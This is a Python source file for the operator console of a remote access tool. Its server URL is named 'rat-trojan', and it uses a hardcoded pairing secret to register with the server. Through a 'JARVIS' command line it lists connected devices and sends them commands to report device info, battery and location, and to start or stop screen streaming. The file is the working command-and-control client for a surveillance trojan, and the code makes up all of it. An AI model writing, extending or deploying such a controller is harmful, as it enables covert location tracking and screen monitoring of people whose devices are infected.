import asyncio
import json
import time
import uuid

import websockets


# ============================================================
# CONFIG
# ============================================================

RENDER_URL = "wss://rat-trojan.onrender.com/ws"

PC_DEVICE_ID = "pc-main"

PAIRING_SECRET = "LAB-123456"

RECONNECT_DELAY = 5


# ============================================================
# GLOBAL STATE
# ============================================================

websocket = None

connected = False
registered = False

devices = {}


# ============================================================
# SEND JSON
# ============================================================

async def send_json(data):

    global websocket

    if websocket is None:
        print("[ERROR] Not connected to Render")
        return False

    try:

        await websocket.send(
            json.dumps(data)
        )

        return True

    except Exception as e:

        print(
            "[SEND ERROR]",
            e
        )

        return False


# ============================================================
# REQUEST DEVICES
# ============================================================

async def request_devices():

    if not registered:

        print(
            "[ERROR] PC is not registered"
        )

        return

    await send_json(
        {
            "type":
                "list_devices"
        }
    )


# ============================================================
# SEND COMMAND
# ============================================================

async def send_command(
    device_id,
    command
):

    command_id = (
        "cmd-" +
        uuid.uuid4().hex[:8]
    )

    success = await send_json(
        {
            "type":
                "command",

            "device_id":
                device_id,

            "command_id":
                command_id,

            "command":
                command
        }
    )

    if success:

        print(
            f"[COMMAND SENT] "
            f"{device_id} "
            f"-> "
            f"{command}"
        )


# ============================================================
# PRINT DEVICES
# ============================================================

def print_devices():

    if not devices:

        print()
        print(
            "No devices found."
        )
        print()

        return

    print()
    print(
        "================================================"
    )
    print(
        "CONNECTED / REGISTERED DEVICES"
    )
    print(
        "================================================"
    )

    for device_id, device in devices.items():

        device_type = device.get(
            "device_type",
            "unknown"
        )

        status = device.get(
            "status",
            "unknown"
        )

        print(
            f"{device_id:<25}"
            f"{device_type:<12}"
            f"{status}"
        )

    print(
        "================================================"
    )
    print()


# ============================================================
# HANDLE DEVICE LIST
# ============================================================

def handle_device_list(data):

    global devices

    new_devices = {}

    for device in data.get(
        "devices",
        []
    ):

        device_id = device.get(
            "device_id"
        )

        if not device_id:
            continue

        new_devices[
            device_id
        ] = device

    devices = new_devices

    print_devices()


# ============================================================
# HANDLE SERVER MESSAGE
# ============================================================

async def handle_message(
    message
):

    if isinstance(
        message,
        bytes
    ):

        print(
            "[BINARY DATA]",
            len(message),
            "bytes"
        )

        return

    try:

        data = json.loads(
            message
        )

    except json.JSONDecodeError:

        print(
            "[INVALID JSON]",
            message
        )

        return

    message_type = data.get(
        "type"
    )

    # ========================================================
    # PC REGISTER RESPONSE
    # ========================================================

    if message_type == "pc_register_response":

        if data.get(
            "success"
        ):

            print(
                "[RENDER] PC registered successfully"
            )

        else:

            print(
                "[RENDER] PC registration failed:",
                data.get("message")
            )

        return

    # ========================================================
    # DEVICE LIST
    # ========================================================

    if message_type == "devices":

        handle_device_list(
            data
        )

        return

    # ========================================================
    # DEVICE CONNECTED
    # ========================================================

    if message_type in (
        "device_connected",
        "device_online"
    ):

        device_id = data.get(
            "device_id"
        )

        device_type = data.get(
            "device_type",
            "unknown"
        )

        devices[
            device_id
        ] = {
            "device_id":
                device_id,

            "device_type":
                device_type,

            "status":
                "online"
        }

        print()
        print(
            "=============================================="
        )
        print(
            "DEVICE CONNECTED"
        )
        print(
            f"ID   : {device_id}"
        )
        print(
            f"TYPE : {device_type}"
        )
        print(
            "STATUS: ONLINE"
        )
        print(
            "=============================================="
        )
        print()

        return

    # ========================================================
    # DEVICE DISCONNECTED
    # ========================================================

    if message_type in (
        "device_disconnected",
        "device_offline"
    ):

        device_id = data.get(
            "device_id"
        )

        if device_id in devices:

            devices[
                device_id
            ]["status"] = "offline"

        print()
        print(
            f"[DEVICE OFFLINE] "
            f"{device_id}"
        )
        print()

        return

    # ========================================================
    # COMMAND RESPONSE
    # ========================================================

    if message_type == "command_response":

        device_id = data.get(
            "device_id"
        )

        command_id = data.get(
            "command_id"
        )

        result = data.get(
            "data"
        )

        print()
        print(
            "================ COMMAND RESPONSE ================"
        )

        print(
            "Device:",
            device_id
        )

        print(
            "Command:",
            command_id
        )

        print(
            json.dumps(
                result,
                indent=4
            )
        )

        print(
            "==================================================="
        )
        print()

        return

    # ========================================================
    # HEARTBEAT
    # ========================================================

    if message_type == "heartbeat_ack":

        return

    # ========================================================
    # ERROR
    # ========================================================

    if message_type == "error":

        print(
            "[RENDER ERROR]",
            data.get(
                "message"
            )
        )

        return

    # ========================================================
    # BINARY METADATA
    # ========================================================

    if message_type == "binary_data":

        print(
            "[BINARY]",
            "device=",
            data.get("device_id"),
            "type=",
            data.get("packet_type"),
            "size=",
            data.get("size")
        )

        return

    # ========================================================
    # UNKNOWN
    # ========================================================

    print(
        "[RENDER]",
        data
    )


# ============================================================
# RECEIVE LOOP
# ============================================================

async def receiver_loop():

    global websocket

    try:

        async for message in websocket:

            await handle_message(
                message
            )

    except Exception as e:

        print(
            "[RECEIVER CLOSED]",
            e
        )


# ============================================================
# HEARTBEAT LOOP
# ============================================================

async def heartbeat_loop():

    while connected:

        await asyncio.sleep(
            10
        )

        if not connected:
            break

        await send_json(
            {
                "type":
                    "heartbeat"
            }
        )


# ============================================================
# REGISTER PC
# ============================================================

async def register_pc():

    await send_json(
        {
            "type":
                "pc_register",

            "device_id":
                PC_DEVICE_ID,

            "device_type":
                "pc",

            "secret":
                PAIRING_SECRET
        }
    )


# ============================================================
# CONNECTION
# ============================================================

async def connect_to_render():

    global websocket
    global connected
    global registered

    try:

        print()
        print(
            "Connecting to Render..."
        )

        async with websockets.connect(
            RENDER_URL,
            ping_interval=20,
            ping_timeout=20
        ) as ws:

            websocket = ws
            connected = True
            registered = False

            print(
                "[CONNECTED]",
                RENDER_URL
            )

            await register_pc()

            registered = True

            receiver_task = asyncio.create_task(
                receiver_loop()
            )

            heartbeat_task = asyncio.create_task(
                heartbeat_loop()
            )

            done, pending = await asyncio.wait(
                [
                    receiver_task,
                    heartbeat_task
                ],
                return_when=asyncio.FIRST_COMPLETED
            )

            for task in pending:

                task.cancel()

    except Exception as e:

        print(
            "[RENDER CONNECTION ERROR]",
            e
        )

    finally:

        connected = False
        registered = False
        websocket = None

        print(
            "[RENDER] Disconnected"
        )


# ============================================================
# CLI
# ============================================================

async def controller_cli():

    print()
    print(
        "================================================"
    )
    print(
        "       JARVIS CLOUD PC CONTROLLER"
    )
    print(
        "================================================"
    )
    print(
        "Type 'help' for commands."
    )
    print()

    while True:

        try:

            command_line = await asyncio.to_thread(
                input,
                "JARVIS> "
            )

        except (EOFError, KeyboardInterrupt):

            return False

        command_line = command_line.strip()

        if not command_line:
            continue

        parts = command_line.split()

        command = parts[0].lower()

        # ==================================================
        # HELP
        # ==================================================

        if command == "help":

            print()
            print(
                "devices"
            )
            print(
                "info <device_id>"
            )
            print(
                "battery <device_id>"
            )
            print(
                "status <device_id>"
            )
            print(
                "location <device_id>"
            )
            print(
                "capabilities <device_id>"
            )
            print(
                "screen-start <device_id>"
            )
            print(
                "screen-stop <device_id>"
            )
            print(
                "refresh"
            )
            print(
                "exit"
            )
            print()

        # ==================================================
        # DEVICES
        # ==================================================

        elif command == "devices":

            await request_devices()

        # ==================================================
        # REFRESH
        # ==================================================

        elif command == "refresh":

            await request_devices()

        # ==================================================
        # INFO
        # ==================================================

        elif command == "info":

            if len(parts) < 2:

                print(
                    "Usage: info <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "device_info"
            )

        # ==================================================
        # BATTERY
        # ==================================================

        elif command == "battery":

            if len(parts) < 2:

                print(
                    "Usage: battery <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "battery_status"
            )

        # ==================================================
        # STATUS
        # ==================================================

        elif command == "status":

            if len(parts) < 2:

                print(
                    "Usage: status <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "connection_status"
            )

        # ==================================================
        # LOCATION
        # ==================================================

        elif command == "location":

            if len(parts) < 2:

                print(
                    "Usage: location <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "location_request"
            )

        # ==================================================
        # CAPABILITIES
        # ==================================================

        elif command == "capabilities":

            if len(parts) < 2:

                print(
                    "Usage: capabilities <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "device_info"
            )

        # ==================================================
        # SCREEN START
        # ==================================================

        elif command == "screen-start":

            if len(parts) < 2:

                print(
                    "Usage: screen-start <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "start_screen"
            )

        # ==================================================
        # SCREEN STOP
        # ==================================================

        elif command == "screen-stop":

            if len(parts) < 2:

                print(
                    "Usage: screen-stop <device_id>"
                )

                continue

            await send_command(
                parts[1],
                "stop_screen"
            )

        # ==================================================
        # EXIT
        # ==================================================

        elif command == "exit":

            print(
                "Exiting..."
            )

            return True

        else:

            print(
                f"Unknown command: {command}"
            )


# ============================================================
# MAIN
# ============================================================

async def main():

    global connected

    # Start CLI
    cli_task = asyncio.create_task(
        controller_cli()
    )

    while True:

        # Connect if not connected
        if not connected:

            await connect_to_render()

            if cli_task.done():
                break

            print(
                f"Reconnecting in "
                f"{RECONNECT_DELAY} seconds..."
            )

            await asyncio.sleep(
                RECONNECT_DELAY
            )

        else:

            await asyncio.sleep(
                1
            )

        if cli_task.done():

            try:
                should_exit = cli_task.result()

            except Exception:
                should_exit = True

            if should_exit:
                break

    if not cli_task.done():

        cli_task.cancel()


# ============================================================
# START
# ============================================================

if __name__ == "__main__":

    try:

        asyncio.run(
            main()
        )

    except KeyboardInterrupt:

        print()
        print(
            "Stopped."
        )